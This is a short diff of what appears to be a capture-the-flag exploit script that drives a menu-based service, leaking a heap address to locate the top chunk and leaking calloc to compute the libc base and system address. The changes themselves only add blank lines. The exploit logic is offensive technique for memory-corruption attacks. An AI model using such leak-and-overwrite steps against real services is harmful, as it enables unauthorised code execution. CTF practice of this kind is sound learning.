@@ -102,6 +102,7 @@ s.recvuntil("[q]uit\n")
 s.sendline("p")
 s.recvuntil("(null)\n\n")
 heap_leak = int(s.recvuntil(" "), 10)
+
 TOP_chunk = heap_leak - 0x94
 
 print
@@ -136,6 +137,7 @@ s.recvuntil("[q]uit\n")
 s.sendline("p")
 s.recvuntil("(null)\n\n")
 libc_calloc = 0x100000000 + int(s.recvuntil(" "), 10)
+
 libc_base = libc_calloc - calloc_off
 libc_system = libc_base + system_off
 
@@ -224,6 +226,7 @@ s.recvuntil("[q]uit\n")
 s.sendline("p")
 s.recvuntil("(null)\n\n")
 heap_leak = int(s.recvuntil(" "), 10)
+
 TOP_chunk = heap_leak - 0x94
 
 print
@@ -248,6 +251,7 @@ s.recvuntil("[q]uit\n")
 s.sendline("p")
 s.recvuntil("(null)\n\n")
 libc_calloc = 0x100000000 + int(s.recvuntil(" "), 10)
+
 libc_base = libc_calloc - calloc_off
 libc_system = libc_base + system_off
 
